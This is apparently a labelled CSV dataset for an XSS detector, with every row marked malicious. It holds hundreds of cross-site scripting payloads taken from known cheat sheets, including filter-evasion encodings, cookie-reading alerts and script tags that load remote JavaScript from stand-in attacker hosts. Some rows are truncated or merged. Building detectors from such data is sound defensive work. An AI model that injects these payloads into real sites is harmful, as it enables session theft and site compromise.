input,label
"<IMG SRC=javascript:alert(""XSS"")>",1
"<IMG SRC=`javascript:alert(""RSnake says",1
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",1
<a onmouseover=alert(document.cookie)>xxs link</a>,1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
"<IMG SRC=# onmouseover=""alert('xxs')"">",1
"<IMG SRC= onmouseover=""alert('xxs')"">",1
"<IMG onmouseover=""alert('xxs')"">",1
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,1
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,1
"<IMG SRC=""jav ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",1
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",1
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",1
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",1
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
<BODY onload!#$%&()*~+-_.,1
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,1
<SCRIPT SRC=//ha.ckers.org/.j>,1
"<IMG SRC=""javascript:alert('XSS')""",1
<iframe src=http://ha.ckers.org/scriptlet.html <,1
"\"";alert('XSS');//",1
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
"<IMG DYNSRC=""javascript:alert('XSS')"">",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",1
"<IMG SRC='vbscript:msgbox(""XSS"")'>",1
"<IMG SRC=""livescript:[code]"">",1
<BODY ONLOAD=alert('XSS')>,1
"<BGSOUND SRC=""javascript:alert('XSS');"">",1
"<BR SIZE=""&{alert('XSS')}"">",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,1
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",1
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",1
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",1
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",1
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<XSS STYLE=""xss:expression(alert('XSS'))"">",1
"<XSS STYLE=""behavior: url(xss.htc);"">",1
¼script¾alert(¢XSS¢)¼/script¾,1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64",1
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",1
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",1
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",1
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
"<BASE HREF=""javascript:alert('XSS');//"">",1
" <OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",1
"<EMBED SRC=""data:image/svg+xml;base64",1
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",1
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",1
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,1
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",1
" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<A HREF=""http://66.102.7.147/"">XSS</A>",1
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",1
"<A HREF=""http://1113982867/"">XSS</A>",1
"<A HREF=""http://0x42.0x0000066.0x7.0x93/"">XSS</A>",1
"<A HREF=""http://0102.0146.0007.00000223/"">XSS</A>",1
"<A HREF=""htt p://6 6.000146.0x7.147/"">XSS</A>",1
"<iframe  src=""&Tab;javascript:prompt(1)&Tab;"">",1
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',1
"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",1
<sVg><scRipt >alert&lpar;1&rpar; {Opera},1
<img/src=`` onerror=this.onerror=confirm(1) ,1
"<form><isindex formaction=""javascript&colon;confirm(1)""",1
<img src=``&NewLine; onerror=alert(1)&NewLine;,1
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,1
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,1
"<iframe/src=""data:text/html;&Tab;base64&Tab;",1
<script /**/>/**/alert(1)/**/</script /**/,1
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>,1
"<iframe/src=""data:text/html",1
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
<svg><script xlink:href=data&colon;,1
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},1
"<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",1
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,1
"<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",1
"</script><img/*/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/*/onerror='eval(src)'>",1
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",1
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;",1
http://www.google<script .com>alert(document.location)</script,1
"<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",1
<img/src=@&#32;&#13; onerror = prompt('&#49;'),1
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,1
<script ^__^>alert(String.fromCharCode(49))</script ^__^,1
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,1
"&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",1
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,1
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1
<script ~~~>alert(0%0)</script ~~~>,1
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,1
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN,1
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},1
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,1
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",1
<iframe// src=javaSCRIPT&colon;alert(1),1
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,1
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",1
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,1
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1
"<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",1
</plaintext\></|\><plaintext/onmouseover=prompt(1),1
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},1
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",1
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",1
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,1
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",1
<%<!--'%><script>alert(1);</script -->,1
"<script src=""data:text/javascript",1
<iframe/src \/\/onload = prompt(1),1
<iframe/onreadystatechange=alert(1),1
<svg/onload=alert(1),1
<input value=<><iframe/src=javascript:confirm(1),1
"<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",1
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1
<img src=`xx:xx`onerror=alert(1)>,1
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",1
"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",1
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",1
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",1
<svg contentScriptType=text/vbs><script>MsgBox+1,1
"<a href=""data:text/html;base64_",1
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,1
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,1
"<script/src=""data&colon;text%2Fj\u0061v\u0061script",1
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,1
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,1
<script>+-+-1-+-+alert(1)</script>,1
<body/onload=&lt;!--&gt;&#10alert(1)>,1
<script itworksinallbrowsers>/*<script* */alert(1)</script,1
<img src ?itworksonchrome?\/onerror = alert(1),1
<svg><script>//&NewLine;confirm(1);</script </svg>,1
<svg><script onlypossibleinopera:-)> alert(1),1
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,1
<script x> alert(1) </script 1=2,1
"<div/onmouseover='alert(1)'> style=""x:"">",1
<--`<img/src=` onerror=alert(1)> --!>,1
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,1
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",1
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href=//jsfiddle.net/t846h/"">click",1
<object data=data:text/html;base64,1
"<iframe src=""data:text/html",1
"<a href=""data:text/html;blabla",1
"'';!--""<XSS>=&{()}",1
'>//\\,1
'); alert('XSS,1
<script>alert(1);</script>,1
<script>alert('XSS');</script>,1
"<IMG SRC=""javascript:alert('XSS');"">",1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=javascript:alert('XSS')>,1
<IMG SRC=javascript:alert(&quot;XSS&quot;)>,1
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",1
<scr<script>ipt>alert('XSS');</scr</script>ipt>,1
<img src=foo.png onerror=alert(/xssed/) />,1
"<style>@im\port'\ja\vasc\ript:alert(\""XSS\"")';</style>",1
"<? echo('<scr)'; echo('ipt>alert(\""XSS\"")</script>'); ?>",1
<marquee><script>alert('XSS')</script></marquee>,1
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",1
"<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",1
"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",1
"><script>alert(0)</script>
<script src=http://yoursite.com/your_files.js></script>
</title><script>alert(/xss/)</script>
</textarea><script>alert(/xss/)</script>
<IMG LOWSRC=\javascript:alert('XSS')\"">",1
"<IMG DYNSRC=\""javascript:alert('XSS')\"">",1
<font style='color:expression(alert(document.cookie))'>,1
"<img src=""javascript:alert('XSS')"">",1
"<script language=""JavaScript"">alert('XSS')</script>",1
"<body onunload=""javascript:alert('XSS');"">",1
"<body onLoad=""alert('XSS');""",1
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]",1
"/></a></><img src=1.gif onerror=alert(1)>
window.alert(Bonjour !"");",1
"<div style=""x:expression((window.r==1)?'':eval('r=1;",1
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>,1
"><script alert(String.fromCharCode(88,83,83))</script>
'>><marquee><h1>XSS</h1></marquee>
'>><script>alert('XSS')</script>",1
"'"">><marquee><h1>XSS</h1></marquee>",1
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=javascript:alert('XSS');\"">",1
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",1
<script>var var = 1; alert(var)</script>,1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<?='<SCRIPT>alert(""XSS"")</SCRIPT>'?>",1
"<IMG SRC='vbscript:msgbox(\""XSS\"")'>",1
" onfocus=alert(document.domain) > <""",1
"<FRAMESET><FRAME SRC=\""javascript:alert('XSS');\""></FRAMESET>",1
"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",1
"perl -e 'print \""<SCR\0IPT>alert(\""XSS\"")</SCR\0IPT>\"";' > out",1
"perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",1
"<br size=\""&{alert('XSS')}\"">",1
<scrscriptipt>alert(1)</scrscriptipt>,1
</br style=a:expression(alert())>,1
</script><script>alert(1)</script>,1
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(XSS"")>",1
[color=red width=expression(alert(123))][color],1
"<BASE HREF=""javascript:alert('XSS');//"">",1
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,1
"></iframe><script>alert(123)</script>
<body onLoad=while(true) alert('XSS');"">",1
"'""></title><script>alert(1111)</script>",1
"</textarea>'""><script>alert(document.cookie)</script>",1
"'""""><script language=""JavaScript""> alert('X \nS \nS');</script>",1
</script></script><<<<script><>>>><<<script>alert(123)</script>,1
<html><noalert><noscript>(123)</noscript><script>(123)</script>,1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
'></select><script>alert(123)</script>,1
"'>""><script src = 'http://www.site.com/XSS.js'></script>",1
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,1
"<SCRIPT>document.write(""XSS"");</SCRIPT>",1
"a=""get"";b=""URL"";c=""javascript:"";d=""alert('xss');"";eval(a+b+c+d);",1
"='><script>alert(""xss"")</script>",1
"<script+src="">""+src=""http://yoursite.com/xss.js?69",1
"<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",1
">/XaDoS/><script>alert(document.cookie)</script><script src=http://www.site.com/XSS.js""></script>",1
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
src=http://www.site.com/XSS.js""></script>",1
data:text/html;charset=utf-7;base64,1
"!--"" /><script>alert('xss');</script>",1
"<script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",1
"><script>alert(XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",1
"'""></title><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",1
"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",1
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,1
"><script>alert(1337)</script>><script>alert(""XSS by \nxss</h1></marquee>",1
"'""></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>",1
"<iframe src=""javascript:alert('XSS by \nxss');""></iframe><marquee><h1>XSS by xss</h1></marquee>",1
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=",1
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??,1
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??,1
'); alert('xss'); var x=',1
\\'); alert(\'xss\');var x=\',1
">""><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>",1
"<img src=""Mario Heiderich says that svg SHOULD not be executed trough image tags"" onerror=""javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');""></img>",1
</body>,1
</html>,1
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>,1
<SCRIPT> alert(“XSS”); </SCRIPT>,1
"<BODY ONLOAD=alert(""XSS"")>",1
"<BODY BACKGROUND=""javascript:alert('XSS')"">",1
"<IMG SRC=""javascript:alert('XSS');"">",1
"<IMG DYNSRC=""javascript:alert('XSS')"">",1
"<IMG LOWSRC=""javascript:alert('XSS')"">",1
<IFRAME SRC=”http://hacker-site.com/xss.html”>,1
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",1
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
"<TD BACKGROUND=""javascript:alert('XSS')"">",1
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",1
"<EMBED SRC=""http://hacker.com/xss.swf"" AllowScriptAccess=""always"">",1
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},1
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;,1
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;,1
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,1
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;,1
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,1
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;,1
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;,1
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;,1
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;,1
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;,1
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;,1
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser,1
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);,1
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS,1
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;,1
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;,1
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;,1
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,1
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;,1
&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;,1
